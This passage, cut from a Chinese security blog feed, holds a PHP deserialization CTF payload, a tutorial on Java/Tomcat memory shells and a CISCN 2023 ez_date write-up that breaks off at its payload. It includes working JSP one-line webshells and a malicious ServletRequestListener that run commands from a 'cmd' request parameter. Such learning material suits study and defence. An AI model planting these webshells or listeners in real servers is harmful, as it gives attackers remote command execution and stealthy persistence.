class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 巅峰极客2023-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-内存马</title>
      <link href="/posts/333d5c9f.html"/>
      <url>/posts/333d5c9f.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1355">参考文章</a>     <a href="https://github.com/Claradoll/Security_Learning">题目用到的代码地址</a></p><p><strong>内存马的分类</strong></p><p><img src="../images/image-20230720170329358.png" alt="image-20230720170329358"></p><p><strong>就是大致分为这四种   下面会依次讲到</strong></p><p><strong>这里的话先了解一下  <code>JSP</code>  是什么</strong></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="JSP简介"><a href="#JSP简介" class="headerlink" title="JSP简介"></a>JSP简介</h3><p><strong>这里主要了解一下  <code>JSP</code>  的语法</strong>    </p><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="JSP语法"><a href="#JSP语法" class="headerlink" title="JSP语法"></a>JSP语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的<strong>Java语句、变量、方法或表达式</strong>，只要它们在脚本语言中是有效的。脚本程序的格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>其等价与下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用实例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;success&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162202992.png" alt="image-20230720162202992"></p><h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明<strong>一个或多个变量、方法</strong>，供后面的Java代码使用。JSP声明语句格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! 声明  %&gt;</span><br></pre></td></tr></table></figure><p>等同于下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:declaration</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:declaration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;s&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162541860.png" alt="image-20230720162541860"></p><h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h4><p>如果JSP表达式中为一个对象，则会自动调用其<code>toString()</code>方法。格式如下，注意表达式后没有<code>;</code></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式  %&gt;</span><br></pre></td></tr></table></figure><p>等价于下面的XML表达式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:expression</span>&gt;</span></span><br><span class="line">   表达式</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:expression</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Feng&quot;</span>; %&gt;</span><br><span class="line">username:&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163023029.png" alt="image-20230720163023029"></p><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page … %&gt;</td><td>定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td></tr><tr><td>&lt;%@ include … %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib … %&gt;</td><td>引入标签库的定义，可以是自定义标签</td></tr></tbody></table></div><p>比如我们能通过page指令来设置jsp页面的编码格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;林&quot;</span>; %&gt;</span><br><span class="line">    用户名：&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163914388.png" alt="image-20230720163914388"></p><h4 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h4><p>格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p><ul><li>由 JSP 规范提供，不用编写者实例化</li><li>通过 Web 容器实现和管理</li><li>所有 JSP 页面均可使用</li><li>只有在脚本元素的表达式或代码段中才能使用</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">对象</th><th style="text-align:left">类型</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">request</td><td style="text-align:left">javax.servlet.http.HttpServletRequest</td><td style="text-align:left">获取用户请求信息</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.http.HttpServletResponse</td><td style="text-align:left">响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.jsp.JspWriter</td><td style="text-align:left">输出内容到 HTML 中</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">javax.servlet.http.HttpSession</td><td style="text-align:left">用来保存用户信息</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">javax.servlet.ServletContext</td><td style="text-align:left">所有用户共享信息</td></tr><tr><td style="text-align:left">config</td><td style="text-align:left">javax.servlet.ServletConfig</td><td style="text-align:left">这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td style="text-align:left">pageContext</td><td style="text-align:left">javax.servlet.jsp.PageContext</td><td style="text-align:left">JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td style="text-align:left">page</td><td style="text-align:left">javax.servlet.jsp.HttpJspPage</td><td style="text-align:left">类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td style="text-align:left">exception</td><td style="text-align:left">java.lang.Throwable</td><td style="text-align:left">该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</td></tr></tbody></table></div><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><p>我们</p><p>先来看看传统的JSP木马是如何实现的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p>上面是最简单的一句话木马，没有回显，适合用来反弹shell。下面是一个带回显的JSP木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720165934722.png" alt="image-20230720165934722"></p><p><strong>这就是上面代码的含义</strong></p><p>传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是**无文件落地，存在于内存之中，隐蔽性强。</p><h2 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h2><p>这里的话就不跟着上面的文章写了 </p><p>直接看总结就行了</p><p><strong>直接用一张图来展示这三者的关系</strong></p><p><img src="../images/image-20230720171447069.png" alt="image-20230720171447069"></p><p>这三者是我们在学习内存马的时候会经常遇到的</p><p><code>ServletContext</code>接口的实现类为<code>ApplicationContext</code>类和<code>ApplicationContextFacade</code>类，其中<code>ApplicationContextFacade</code>是对<code>ApplicationContext</code>类的包装。我们对<code>Context</code>容器中各种资源进行操作时，最终调用的还是<code>StandardContext</code>中的方法，因此<code>StandardContext</code>是<code>Tomcat</code>中负责与底层交互的<code>Context</code>。</p><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.55<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的使用的文件直接就是文章开头的<code>github</code>地址用的   下载下来导入就行了</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里的话模拟动态注册进去的<code>Listener</code>内存马</strong>      (<strong>等会我们分析完这个流程就会重新动态的导入一个内存马，并把上面的这个代码给注释掉</strong>)</p><p><img src="../images/image-20230720172131744.png" alt="image-20230720172131744"></p><p>​    </p><p>给这里下个断点  然后<code>debug</code>一下 得到他的利用栈</p><p><img src="../images/image-20230720172237569.png" alt="image-20230720172237569"></p><p>分析这个利用栈</p><p><code>StandardContext#fireRequestInitEvent</code>调用了我们的<code>Listener</code>，我们跟进看其实现</p><p><img src="../images/image-20230720172338598.png" alt="image-20230720172338598"></p><p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p><p>这里的获取这个<code>Listener</code>就是关键了  因为就是我们就是恶意构造一个<code>Listener</code>传进去 然后让其获取加载(<strong>不出意外的话继续找下去能找到添加<code>Listener</code>的地方</strong>)</p><p><img src="../images/image-20230720173457320.png" alt="image-20230720173457320"></p><p>可以看到Listener实际上是存储在<em><code>applicationEventListenersList</code></em>属性中的</p><p><img src="../images/image-20230720173533994.png" alt="image-20230720173533994"></p><p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加<code>Listener</code></p><p><img src="../images/image-20230720173728831.png" alt="image-20230720173728831"></p><p>看到这里的话就和我们刚开始添加的这个<code>Listener</code>联系到一起了</p><p><img src="../images/image-20230720173826866.png" alt="image-20230720173826866"></p><p>实际情况中是没有它的  现在我们分析利用链  分析到了这个添加<code>listener</code>的地方</p><p>所以我们就得想办法构造恶意的<code>listener</code>来添加进去了</p><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="../images/image-20230720174343442.png" alt="image-20230720174343442"></p><p>同样地，由于<code>JSP</code>内置了<code>request</code>对象，我们也可以使用同样的方式来获取</p><p><strong>(一共内置了9个对象   <code>request</code>是其中一个)</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nss-Ciscn2023</title>
      <link href="/posts/b7182eee.html"/>
      <url>/posts/b7182eee.html</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><p><strong>题目给的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719200322956.png" alt="image-20230719200322956"></p><p>这里的话不给使用数组进行绕过  经过本地测试</p><p><img src="../images/image-20230719200414990.png" alt="image-20230719200414990"></p><p>可以使用<strong>数字型</strong>和<strong>字符型</strong>进行绕过</p><p><img src="../images/image-20230719201900384.png" alt="image-20230719201900384"></p><p>剩下的关键点就是这个如何绕过这个<code>date</code>函数了</p><p>因为这个正则匹配的话是没过滤字母啥的   所以只要不使用奇奇怪怪的东西就不会被正则到</p><p><img src="../images/image-20230719202055816.png" alt="image-20230719202055816"></p><p><img src="../images/image-20230719202109278.png" alt="image-20230719202109278"></p><p>将字母转义后  就可以输出正常的字母了</p><p>最后的<strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 